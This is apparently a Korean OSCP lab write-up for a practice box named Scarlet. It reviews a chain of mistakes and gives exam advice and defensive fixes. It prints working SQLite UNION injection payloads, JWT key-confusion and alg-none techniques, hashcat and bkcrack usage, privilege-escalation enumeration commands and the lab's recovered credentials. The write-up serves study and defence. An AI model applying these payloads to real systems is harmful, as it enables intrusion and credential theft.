문제는 시간이 아니라 **판단 순서**다. 요청 몇 개면 끝날 판정을 스캐너에 맡겼다:

```bash
curl -s -i http://192.168.248.222/ | head -20     # 3초. 66바이트인 걸 즉시 안다
```

> [!danger] **버스팅을 시작하기 전에 루트 페이지를 눈으로 봐라**
> 순서는 이렇다:
> 1. `curl -si http://TARGET/` — 상태코드·크기·서버 헤더·본문
> 2. **본문이 비정상적으로 작으면(수십~수백 바이트) vhost를 의심**하고 호스트명부터 찾는다
> 3. 그 다음에 버스팅
>
> 이 순서면 3분이 아니라 30초다. **디렉터리 버스팅은 "볼 게 있는 사이트"에 거는 도구**다.

### ② `ssh-keygen -f public.key -e -m PKCS8` 이 빈 출력으로 실패

```bash
└─$ ssh-keygen -f public.key -e -m PKCS8 2>/dev/null | head
              ← 아무것도 안 나온다
```

**원인:** `ssh-keygen -e`는 **OpenSSH 형식 키를 다른 형식으로 내보내는(export)** 명령이다. 입력이 이미 PKCS#8 PEM(`-----BEGIN PUBLIC KEY-----`)이므로 파싱에 실패했고, `2>/dev/null`이 에러 메시지까지 삼켰다.

방향이 반대다. 필요했던 것은 **PEM → OpenSSH 형식(import)** 이다:

```bash
ssh-keygen -i -m PKCS8 -f public.key      # -i = import.  ssh-rsa AAAAB3... 를 얻는다
```

> [!warning] **`2>/dev/null`이 진단을 지운다**
> 노이즈를 줄이려고 붙인 리다이렉션이 **"왜 실패했는지"까지 버린다.** 결과가 비면 `2>/dev/null`을 떼고 다시 친다. 이건 3초짜리 습관인데 놓치면 몇 분을 태운다.
>
> **`ssh-keygen`의 `-i` / `-e` 방향 정리:**
> | 옵션 | 방향 | 용도 |
> |---|---|---|
> | `-i -m PKCS8` | PEM/PKCS8 **→** OpenSSH | `authorized_keys`에 넣을 형태로 |
> | `-e -m PKCS8` | OpenSSH **→** PEM/PKCS8 | openssl로 다루려고 |
> | `-e -m PEM` | OpenSSH **→** 전통 PEM | 구형 도구 호환 |
> | `-y -f <개인키>` | 개인키 **→** 공개키 | 키 쌍 대조 |

**다만 이 실패는 결과에 영향이 없었다.** `openssl rsa -pubin`으로 이미 키 유효성이 확인됐고, JWT 키 혼동에 필요한 것은 **PEM 파일 원본 그대로**였기 때문이다. 형식 변환은 애초에 불필요한 우회였다.

### ③ JSON 로그인이 실패 — 두 변수를 동시에 바꿨다

첫 시도는 `Content-Type: application/json` + `admin:admin`, 두 번째는 `application/x-www-form-urlencoded` + `4leaf:password1`. 두 번째가 성공했다.

**하지만 무엇이 원인인지 이 기록으로는 알 수 없다.** 자격증명이 틀렸던 건가, Content-Type이 안 맞았던 건가?

**둘 다일 가능성이 높다.** Express 앱이 `express.urlencoded()`만 등록하고 `express.json()`을 안 붙였으면, JSON 본문은 파싱되지 않아 `req.body.username`이 `undefined`가 된다 — 자격증명이 맞아도 실패한다. `[가정]` 복호화한 `out/web/index.js`를 열면 확정할 수 있었다.

> [!danger] **한 번에 한 변수만 바꿔라**
> 두 개를 동시에 바꾸고 성공하면 **원인을 모른 채 진도만 나간다.** 다음에 같은 상황을 만나면 또 헤맨다.
> 로그인 폼을 만나면 **먼저 브라우저나 프록시로 실제 요청을 관찰**한다:
> ```bash
> # 폼의 enctype과 필드명을 확인
> curl -s http://scarlet.local/login | grep -iE '<form|<input'
> ```
> 그러면 Content-Type과 필드명이 확정되고, **자격증명만 변수로 남는다.**

### ④ `admin` 위조 토큰 — 서명은 통과했는데 사용자가 없다

키 혼동으로 `{"username":"admin"}` 토큰을 만들었고 서버가 서명을 받아들였다. **하지만 `admin` 계정이 DB에 존재하지 않았다.**

이게 이 박스의 첫 번째 함정이다:

> [!danger] **"위조에 성공했다"와 "권한을 얻었다"는 다르다**
> JWT 위조는 **인증(authentication)을 우회**한다. 하지만 그 다음에 애플리케이션이 **DB를 조회**하면, 존재하지 않는 사용자는 아무것도 얻지 못한다.
> `admin`·`administrator`·`root`는 **웹앱에서 의외로 존재하지 않는 경우가 많다.** 특히 커스텀 앱은 실명 계정만 쓴다.
> **대응 순서:**
> 1. 실제 사용자명을 먼저 확보한다 — 웹사이트 본문, `/robots.txt`, 커밋 로그, 이메일 주소, 페이지 푸터
> 2. 존재/부재를 구분하는 **응답 차이**(`doesn't exist` 같은 메시지, 상태코드, 길이, 시간)를 찾아 오라클로 삼는다
> 3. 그 오라클로 후보를 순회한다
>
> 이 박스는 `doesn't exist`라는 문구가 그대로 오라클이 됐다. **친절한 에러 메시지가 곧 열거 취약점이다.**

### ⑤ `brian` 토큰으로 들어갔는데 **변동사항이 없다** — 두 번째 막다른 길

존재하는 유일한 사용자 `brian`으로 포털을 열었다. 그런데 원문 기록은 한 줄이다: **"brian 아이디로 접근시 변동사항 없음"**.

관리 메뉴도, 추가 정보도 없었다. **인증 우회에 성공했지만 얻은 게 없는 상태**다.

여기서 나온 판단이 이 박스를 푼다:

> [!tip] **권한이 안 오르면, 그 파라미터를 "출력 채널"로 다시 봐라**
> `username` 클레임으로 얻을 수 있는 것이 `brian`뿐이라면 — **클레임 자체를 인젝션 지점으로 재해석**한다.
> 사고 전환: "이 값이 **누구인가를 결정**한다"에서 "이 값이 **어떤 쿼리를 만드는가**"로.
> 그래서 다음 수가 `brian'` 한 글자였고, 그게 `SQLITE_ERROR`를 뱉었다.
>
> **일반화: 값이 DB 조회에 쓰이는 것이 확실한 파라미터는, 권한 조작이 막히면 반드시 인젝션을 시험한다.** 순서는 ① 값 조작(권한) → ② 문법 파괴(인젝션). 대부분 ②를 잊는다.

### ⑥ 스키마 추출([1])이 빈 결과 — 폴백이 없었으면 막혔다

```
=== [1] 전체 스키마 (모든 테이블 CREATE 문) ===
                          ← 빈 줄
=== [2] 테이블 이름 목록 ===
users sqlite_sequence     ← 이건 됐다
```

같은 `sqlite_master`를 조회하는데 `name`은 나오고 `sql`은 안 나왔다.

**원인 `[가정]`:** 추출 정규식이 `grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'` 이다. `grep`은 **줄 단위**로 동작하고 `.`은 개행에 매치되지 않는다. `CREATE TABLE` 문은 여러 줄에 걸쳐 있으므로:

```sql
-- 예시 — 이 박스에서 발생한 출력이 아니다 (전형적인 형태)
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    ...
)
```

이 값이 HTML에 삽입되면 **`<strong>Hey` 와 `, <br>` 사이에 개행이 들어가고, 한 줄 안에서 두 앵커가 함께 매치되지 않는다.** 그래서 빈 출력이다.

**해결책 셋:**

```bash
# ① 개행을 SQL 안에서 제거한다  ← 가장 확실
inject "zzz' UNION SELECT group_concat(replace(replace(sql,char(10),' '),char(13),' '),' ||| '),2,3 FROM sqlite_master WHERE type='table'-- -"

# ② 줄바꿈을 무시하고 추출한다 (tr로 개행 제거 후 grep)
curl -s "$URL" -H "Cookie: session=$token" | tr '\n' ' ' | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'

# ③ 애초에 hex로 뽑아 개행 문제를 없앤다
inject "zzz' UNION SELECT group_concat(hex(sql),' '),2,3 FROM sqlite_master WHERE type='table'-- -"
```

> [!warning] **인젝션이 실패한 게 아니라 "추출이 실패"한 경우를 구분하라**
> 빈 결과를 보고 "이 쿼리는 안 되는구나" 하고 다른 페이로드로 넘어가면 시간을 태운다.
> **판별법: 길이가 짧고 개행이 없는 값으로 먼저 시험한다.** `UNION SELECT 'AAA',2,3` 이 화면에 `AAA`로 나오면 추출 파이프라인은 정상이다. 그 다음 실제 데이터를 뽑는다.
> 이 박스에서는 `[2]`의 테이블 이름(개행 없음)이 나온 시점에 **"파이프라인은 멀쩡하고 데이터 형태가 문제"** 라고 판정할 수 있었다.

**이 실패를 폴백이 구했다.** 스크립트 `[3]`이 `users`·`user`·`accounts`… × 흔한 컬럼 조합 5종을 순회한 덕에 답이 나왔다. **자동 폴백을 미리 짜 두는 것이 시험에서 유효한 이유**다.

### ⑦ `cat lo` 오타

```bash
$ cat lo
cat: lo: No such file or directory
```

사소하지만 원인이 있다 — **로그인 셸이 `/bin/sh`라 탭 완성이 없었다.** 그래서 다음 명령이 `/bin/bash -i`였다. **셸을 잡으면 즉시 bash로 올리는 습관**이 이런 잔실수를 없앤다.

### ⑧ `sudo -l` 기록이 없다 — 표준 열거의 구멍

권한상승 열거에서 `/etc/exports`·SUID·capability·crontab은 쳤는데 **`id`와 `sudo -l` 기록이 없다.**

`sudo -l`은 **가장 싸고 가장 자주 답을 주는 명령**이다. 이 박스에서는 결과적으로 다른 경로가 있었지만, **순서상 첫 번째로 쳤어야 한다.**

> [!danger] 셸을 잡은 직후 30초 안에 끝내는 것
> ```bash
> id ; sudo -l ; cat /etc/passwd | grep -v nologin ; ls -la ~ ; history
> ```
> `sudo -l`이 비밀번호를 요구하면 이미 아는 비밀번호(`Standingbytheseaside12`)를 넣어본다. **비밀번호를 알고 SSH로 들어온 경우 `sudo -l`은 반드시 친다.**

### ⑨ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 판단 |
|---|---|---|
| nmap 전수 스캔 | 27초 | 적절 |
| **IP 대상 feroxbuster** | **3분** | **손절 지점.** 30초 만에 66바이트를 확인하고 중단했어야 한다 |
| vhost 발견 후 재스캔 | 6분 | 길지만 앱 구조 파악에 필요. `-t 30`으로 낮췄으면 오류도 줄고 결과도 정확했을 것 |
| NFS 마운트 → 공개키 | 1분 미만 | **투자 대비 최고 효율.** 이걸 먼저 했어야 한다 |
| JWT 키 혼동 확인 | 수 분 | 적절 |
| 사용자 열거 | 수 분 | 적절 |
| SQLi 스키마 추출 실패 | 불명 | 폴백이 있어 손실 최소 |
| **`zip2john` + `john` 사전공격** | 불명(히스토리에만 남음) | **손절 지점.** `unzip -l`로 목록을 먼저 봤다면 **시도할 이유 자체가 없었다**(⑪) |
| bkcrack | **5초** | 재료가 갖춰지면 즉시 |

> [!tip] **이 박스의 최적 순서**
> ```
> nmap -p-  →  showmount -e  →  NFS 마운트 (여기까지 2분)
>            ↘  curl -si http://IP/  →  66바이트 확인 → vhost 추정 (30초)
> ```
> **정찰 단계에서 NFS와 웹을 병렬로 굴린다.** NFS는 답이 빠르고, 웹은 vhost 판정만 먼저 끝낸 뒤 본격 버스팅은 호스트명을 붙이고 한 번만 돈다.
> **시험 손절 기준: 한 서비스에 20분을 넘기면 다른 서비스로 옮긴다.** 옮긴 곳에서 얻은 정보가 원래 서비스를 열어주는 경우가 이 박스처럼 흔하다.

### ⑩ 밟지 않은 길 (기록상 확인)

- **`web/assets/images/hashes.json`** — 백업 zip 안에 있었지만 열어본 기록이 없다. 이름부터 수상하다. `[가정]` 다른 사용자의 해시나 대체 경로였을 수 있다
- **`web/private.key`** — 복호화 후 확보했지만 쓰지 않았다. **순서가 반대였다면(먼저 zip을 풀었다면) 키 혼동 없이 정상 RS256 토큰을 발행하는 것이 정공법**이었다
- **`out/web/helpers/JWTHelper.js` · `out/web/routes/index.js`** — 취약점의 원인 코드인데 내용 기록이 없다. **OSCP 보고서라면 이걸 인용해야 근본 원인 서술이 선다**
- **`/home/brian/web/database.db`** — SQLi로 덤프했지만 셸을 잡은 뒤 직접 열어보지 않았다. `sqlite3 database.db '.dump'` 한 줄이면 전체가 나온다

### ⑪ `zip2john` + `john` 사전공격을 먼저 태웠다가 실패하고 bkcrack로 전환했다

원문 터미널에는 안 나오지만 Kali에 흔적이 남아 있다 — 작업 디렉터리에 **`zip.hash`가 그대로 있고**, `~/.zsh_history` 2386~2455행이 **`zip2john backup.zip > zip.hash` → `john --wordlist=rockyou.txt` → 실패 → Jumbo 룰까지 적용 → 실패 → 포기** 순서를 기록한다.

즉 4-3절의 "**5초**"라는 결과 앞에는 **사전공격에 태운 시간이 먼저 있었다.**

> [!tip] 판단 분기를 앞으로 당겨라 — **목록을 먼저 본다**
> `unzip -l`로 아카이브 안에 **내가 이미 가진 파일**(`web/public.key`)이 있다는 것을 확인한 시점에, 사전공격은 **시도할 이유가 사라진다.** 순서는 이렇다:
> ```bash
> unzip -l backup.zip            # ① 목록 — 암호 없이 읽힌다. 내가 아는 파일이 있는가?
> 7z l -slt backup.zip           # ② Method 가 ZipCrypto 인가 AES 인가
> #   ZipCrypto + 아는 파일 있음  →  bkcrack (수 초)
> #   그 외                      →  그때 비로소 zip2john + john/hashcat
> ```
> **`rockyou`로 안 풀렸다는 사실 자체는 정보가 아니다.** 이 박스의 zip 암호는 **끝내 알아내지 못했고, 알 필요도 없었다** — bkcrack가 복구하는 것은 비밀번호가 아니라 **내부 키 3개**이기 때문이다(2-5절).
> 이것이 frontmatter 태그를 `tech/cred/crack`에서 **`tech/crypto/known-plaintext`로 바꾼 이유**다. 이 박스는 비밀번호를 크랙한 박스가 아니다 — **비밀번호를 우회한 박스**다.

---

## 7. OSCP 시험 관점

1. **`-p-` 전수 스캔은 타협하지 마라 — 단 이 박스의 NFS는 그 근거가 아니다.** `mountd`가 53291·53845·59493에 흩어져 있지만, **`showmount`는 111번 portmapper에 물어 mountd 포트를 런타임에 받는다.** 111·2049가 top-1000에 있으므로 **기본 스캔만으로도 NFS 열거는 온전했다.** `-p-`의 값어치는 "고번호 포트에 무엇이 붙어 있는지 문서화"와 **비표준 포트에 숨은 서비스**를 놓치지 않는 데 있다. 급하면 2단계로 나눠라 — `nmap -p- --min-rate 10000 -T4`로 포트만 뽑고, 열린 포트에만 `-sCV`를 다시 건다.

2. **111/2049가 보이면 웹보다 NFS를 먼저 밟아라.** 셸 없이 파일을 읽을 수 있는 서비스는 우선순위가 다르다. `showmount -e` → `mount` → `ls -lan`까지 **1분**이면 끝난다. 이 박스는 그 1분이 체인 전체를 열었다.
   ```bash
   showmount -e TARGET ; showmount -a TARGET ; showmount -d TARGET
   mkdir -p /tmp/nfs && sudo mount -t nfs TARGET:/EXPORT /tmp/nfs -o nolock
   ls -lanR /tmp/nfs | head -100
   ```

3. **`no_root_squash`가 없어도 NFS를 버리지 마라.** 고전 SUID 권한상승은 못 하지만 **읽기만으로 충분한 경우가 훨씬 많다.** 찾을 것: `id_rsa`·`.ssh/`·`*.key`·`*.pem`·`.env`·`config.php`·`*.db`·`*.zip`·`.bash_history`·`shadow`.

4. **비정상적으로 작은 응답(수십~수백 바이트)은 vhost 신호다.** 버스팅을 걸기 전에 `curl -si http://IP/`로 루트를 본다. 작으면 호스트명을 찾아 `/etc/hosts`에 박고 다시 친다. 후보: 박스 이름 + `.local`/`.htb`/`.com`, TLS 인증서 CN/SAN, 리다이렉트 `Location`, 페이지 본문.

5. **⚠️ jwt_tool이 없을 때의 수동 대안을 익혀둬라.** (3-4절의 openssl/PyJWT 절차) JWT 공격은 세 갈래다:
   | 공격 | 조건 | 방법 |
   |---|---|---|
   | `alg: none` | 서버가 `none`을 수용 | 헤더를 `{"alg":"none"}`, 서명 조각을 빈 문자열로 |
   | **RS256 → HS256 키 혼동** | **공개키 확보 + `algorithms` 미지정** | **공개키를 HMAC 비밀키로 서명. 이 박스** |
   | 약한 HMAC 비밀키 | HS256인데 비밀키가 사전 단어 | `hashcat -m 16500 token.txt rockyou.txt` |
   | `kid` 인젝션 | 헤더 `kid`가 파일 경로/SQL로 쓰임 | `../../dev/null` + 빈 키, 또는 SQLi |
   순서: **① 헤더의 `alg`를 본다 → ② RS*면 공개키를 찾는다 → ③ HS*면 크랙한다 → ④ `kid`/`jku`/`x5u`가 있으면 그쪽을 판다.**

6. **⚠️ sqlmap 금지 → 수동 UNION 절차를 몸에 붙여라.** 이 박스는 처음부터 끝까지 수동이었다. SQLite 기준 순서:
   ```sql
   '                                         -- 에러 유발 → DBMS 확정
   ' ORDER BY 3-- -      /  ' ORDER BY 4-- - -- 컬럼 수 이진 탐색
   zzz' UNION SELECT 1,2,3-- -               -- 반사 위치 확인
   zzz' UNION SELECT group_concat(name,' '),2,3 FROM sqlite_master WHERE type='table'-- -
   zzz' UNION SELECT group_concat(sql,' '),2,3 FROM sqlite_master WHERE name='users'-- -
   zzz' UNION SELECT group_concat(username||':'||password,'  '),2,3 FROM users-- -
   ```
   **DBMS별 카탈로그 대조표:**
   | DBMS | 테이블 목록 | 컬럼 목록 | 문자열 연결 |
   |---|---|---|---|
   | SQLite | `sqlite_master` (`name`,`sql`) | `pragma_table_info('t')` | `\|\|` |
   | MySQL | `information_schema.tables` | `information_schema.columns` | `CONCAT()` / `CONCAT_WS()` |
   | PostgreSQL | `pg_tables` / `information_schema.tables` | `information_schema.columns` | `\|\|` |
   | MSSQL | `sys.tables` / `INFORMATION_SCHEMA.TABLES` | `sys.columns` | `+` |
   | Oracle | `all_tables` | `all_tab_columns` | `\|\|` |

7. **인젝션 지점은 폼 필드만이 아니다.** 쿠키·JWT 클레임·헤더(`X-Forwarded-For`, `User-Agent`, `Referer`)·파일명·JSON 키. **"인증 미들웨어를 통과한 값"이 특히 위험하다** — 개발자가 신뢰하기 때문이다. 값 조작으로 권한이 안 오르면 **문법 파괴를 시험하라.**

8. **평문 비밀번호가 나오면 즉시 SSH·SMB·서비스에 재사용을 시도하라.** 해시가 아니라 평문이 나왔다는 것 자체가 "보안을 신경 안 쓴 시스템"의 신호다.
   ```bash
   ssh user@TARGET                      # 같은 비밀번호
   crackmapexec smb TARGET -u u -p p    # SMB가 있으면
   su - otheruser                       # 셸이 있으면 다른 계정에도
   ```

9. **암호 걸린 아카이브는 목록부터 본다.** 목록은 암호 없이 읽힌다.
   ```bash
   unzip -l backup.zip ; unzip -v backup.zip     # 목록 + 압축 방식 + 암호화 표시(*)
   7z l -slt backup.zip | grep -E 'Path|Method'  # ZipCrypto 인가 AES 인가
   ```
   **판단 분기:** AES-256 → `zip2john` + `hashcat -m 13600` 사전공격만. **ZipCrypto + 내용물 중 하나를 안다 → bkcrack (수 초).** ZipCrypto + 모름 → 아카이브 안에 `bootstrap.min.css`·`jquery.min.js` 같은 **인터넷에서 동일 바이트를 구할 수 있는 파일**이 있는지 본다.

10. **획득한 파일을 "다 썼다"고 치우지 마라.** 이 박스의 `public.key`는 **JWT 위조 재료**로 한 번, **zip known-plaintext**로 또 한 번 쓰였다. 두 번째 쓰임을 못 떠올리면 여기서 막힌다. **작업 디렉터리에 모은 아티팩트를 새 벽에 부딪힐 때마다 다시 훑는 습관.**

11. **개인키를 얻으면 `chmod 600` → `ssh-keygen -l -f`로 코멘트 확인 → 로그인.** 순서를 지켜라. 권한을 안 고치면 키가 조용히 무시되고, 코멘트를 안 보면 사용자명을 몰라 헤맨다. CRLF·트레일링 공백도 확인한다(`file`, `dos2unix`).

12. **셸을 잡자마자 칠 명령 5개** — 이 박스에서 `sudo -l`이 빠졌다:
    ```bash
    id ; sudo -l
    find / -perm -4000 -type f 2>/dev/null | grep -v snap
    getcap -r / 2>/dev/null
    cat /etc/crontab ; ls -la /etc/cron.*
    ls -la /opt /srv /var/backups /var/www /home/*      # ← 이 박스의 정답
    ```
    **SUID/capability/cron이 전부 기본값이면 즉시 "파일 기반 경로"로 전환한다.** `/opt`의 낯선 파일 하나가 답인 경우가 많다.

13. **웹앱이 어느 uid로 도는지 먼저 확인하라.** `ps aux | grep node` 결과가 `brian`이었다 — **웹 RCE를 얻어도 이미 가진 권한**이다. 이걸 알면 "웹셸을 심어 권한상승" 방향을 즉시 접고 다른 곳을 판다. (반대 사례: [[Hawat]]는 nginx가 root라 웹셸이 곧 root였다)

14. **디렉터리 버스팅의 `errors:` 수를 확인하라.** 38만 오류는 "스캔 완료"가 아니라 "상당수 미확인"이다. Node 단일 프로세스 앱에 `-t 100`은 과하다. **`-t 20~30`으로 낮추고 오류가 많으면 핵심 경로만 재확인.**

15. **한 번에 한 변수만 바꿔라.** Content-Type과 자격증명을 동시에 바꿔 성공하면 원인을 모른 채 넘어간다. 다음 박스에서 또 헤맨다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **NFS export가 `*`(전 호스트 허용)** | `/etc/exports`에 **CIDR이나 호스트명으로 제한**한다 — `/mnt/share 10.0.0.0/24(ro,sync,no_subtree_check)`. 인터넷/DMZ에서 111·2049 접근을 방화벽으로 차단 |
| NFS로 민감 파일이 나갔다 | export 디렉터리에 **애플리케이션 키 자료를 두지 않는다.** 공유가 필요하면 `ro` + 파일 단위 권한. 근본적으로는 **NFSv4 + Kerberos(`sec=krb5p`)** 로 이전 |
| **JWT 검증에 알고리즘을 고정하지 않음** | `jwt.verify(token, key, { algorithms: ['RS256'] })` — **허용 알고리즘 화이트리스트를 반드시 명시**한다. 이 한 줄이 체인 전체를 끊는다 |
| 서명 검증과 서명 생성에 같은 인자를 씀 | 검증용 공개키와 서명용 개인키를 **다른 변수·다른 함수 경로**로 분리. 라이브러리 선택 시 `alg` 자동 판별 API를 쓰지 않는다 |
| `exp` 클레임 부재 | `iat`만으로는 만료가 없다. **`exp`를 넣고 서버가 검증**한다. 세션 무효화가 필요하면 `jti` + 폐기 목록 |
| **JWT 클레임을 SQL에 문자열 연결** | **파라미터 바인딩**: `db.get("SELECT ... WHERE username = ?", [username])`. "미들웨어를 통과했으니 안전"이라는 전제를 코드에서 제거 |
| **DB 에러가 응답에 그대로 노출** | 프로덕션에서 스택트레이스·DBMS 에러를 숨긴다(Express: `app.set('env','production')` + 에러 핸들러). 클라이언트에는 일반 메시지만 |
| **존재하지 않는 사용자에 `doesn't exist` 응답** | 사용자 열거 취약점이다. 존재/부재에 **동일한 일반 메시지**를 반환한다 |
| **비밀번호 평문 저장** | `bcrypt`/`argon2id`로 해시 + 사용자별 솔트. 이 하나만 고쳤어도 SQLi 결과가 즉시 SSH 로그인으로 이어지지 않았다 |
| **웹 비밀번호 = 시스템 비밀번호** | 계정 분리. 서비스 계정은 `nologin` 셸 |
| **`/opt/backup.zip`을 시스템에 방치** | 백업은 **대상 호스트에 두지 않는다.** 부득이하면 `chmod 600 root:root` + 별도 볼륨. 정기 삭제 |
| **ZipCrypto 사용** | 전통 zip 암호는 known-plaintext에 깨진다. **AES-256 zip(`7z a -tzip -mem=AES256`)** 또는 GPG/age로 암호화 |
| **백업 안에 root SSH 개인키 평문** | 개인키를 백업에 포함하지 않는다. 불가피하면 **패스프레이즈를 건다.** 유출 정황이 있으면 즉시 로테이션 |
| root SSH 키 로그인 허용 | `PermitRootLogin no`. 관리 접근은 일반 계정 + `sudo`로 |
| Ubuntu 22.04 미패치(27개 대기, 재부팅 필요) | 패치 관리. 이 박스에서 커널 익스플로잇은 쓰이지 않았지만 **표면을 남긴다** |

---

## 9. 참고 자료

- **CVE 없음** — 전부 **커스텀 애플리케이션의 설정·구현 결함**이다
  - OWASP A01: Broken Access Control (NFS `*` export)
  - OWASP A02: Cryptographic Failures (JWT alg 혼동, ZipCrypto, 평문 비밀번호)
  - OWASP A03: Injection (JWT 클레임 → SQLite)
- **JWT 알고리즘 혼동** — Auth0, "Critical vulnerabilities in JSON Web Token libraries" (2015): https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- **RFC 8725 — JSON Web Token Best Current Practices**: https://www.rfc-editor.org/rfc/rfc8725 (§3.1 "Perform Algorithm Verification")
- **jwt_tool**: https://github.com/ticarpi/jwt_tool — `-X k`(key confusion) · `-X a`(alg:none) · `-C -d <wordlist>`(HMAC 비밀키 크랙)
- **PortSwigger Web Security Academy — JWT attacks**: https://portswigger.net/web-security/jwt
- **bkcrack** (ZipCrypto known-plaintext): https://github.com/kimci86/bkcrack — `tools/deflate.py`가 평문 전처리용
- **Biham & Kocher, "A Known Plaintext Attack on the PKZIP Stream Cipher" (FSE 1994)** — bkcrack의 이론적 근거
- **NFS `exports(5)` 매뉴얼** — `root_squash` / `no_root_squash` / `all_squash` / `anonuid` / `anongid`: `man 5 exports`
- **HackTricks — 2049 NFS**: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
- **SQLite 스키마 카탈로그**: `sqlite_master` — https://www.sqlite.org/schematab.html
- **hashcat 모드**: `-m 16500` JWT(HS256) · `-m 13600` WinZip AES · **`-m 17225` PKZIP(mixed multi-file)** — `17220`이 compressed multi-file이다. 이 박스에서 실제로 만든 `zip.hash`는 `$pkzip$8*1*1*0*8*24*…` 형태의 **mixed multi-file**이므로 **번호 17225 자체는 맞다**

---

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/etc/hosts`에 `192.168.248.222 scarlet.local` (칼리 측) | 로컬 변경 — 정리 대상 |
| `/tmp/nfs` 마운트 (칼리 측) | `sudo umount /tmp/nfs` 로 해제 필요 |
| `zip.hash`(zip2john 산출물, 미해독) · `pub.deflate` · `decrypted.zip` · `out/`(칼리 측) | 남아 있음 — **`zip.hash`는 사전공격이 실패한 흔적**이다(6장 ⑪) |
| `/tmp/bk/` (타겟 측, backup.zip 작업 디렉터리) | **남아 있음** — 랩 Stop/Revert로 소멸 |
| 위조 JWT 세션 (Max-Age 900초) | 자동 만료 |
| root SSH 로그인 기록 (`wtmp`/`auth.log`) | 남아 있음 |

**획득 자격증명:**

| 계정 | 값 | 출처 |
|---|---|---|
| `4leaf` | `password1` | `[가정]` 웹사이트 본문 — 원문에 출처 기록 없음 |
| `brian` | `Standingbytheseaside12` | SQLi로 `users` 테이블 덤프 |
| `root` (SSH 키) | `out/ssh-keys/id_rsa` (`root@scarlet`) | `/opt/backup.zip` bkcrack 복호화 |
| JWT 서명 개인키 | `out/web/private.key` | 동일 (미사용) |

---

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — **백업 아카이브에서 소스/키를 확보해 체인을 여는 동일 패턴.** 다만 Hawat은 웹서버가 root라 권한상승이 없었고, Scarlet은 웹서버가 일반 사용자라 별도 경로가 필요했다
- **누적 패턴 "응답이 성공을 뜻하지 않는다"** — 이 박스에서도 반복됐다. 위조 토큰이 `200 OK`를 받았지만 `admin`은 존재하지 않았고, `brian`으로 들어가도 얻는 게 없었다
- **새 패턴 "한 아티팩트를 두 번 써라"** — `public.key`가 JWT 위조 재료이자 zip known-plaintext였다. 다른 노트에서 같은 구조를 만나면 여기로 링크할 것
- [[01. Pentest Foundations]] — Scarlet 항목
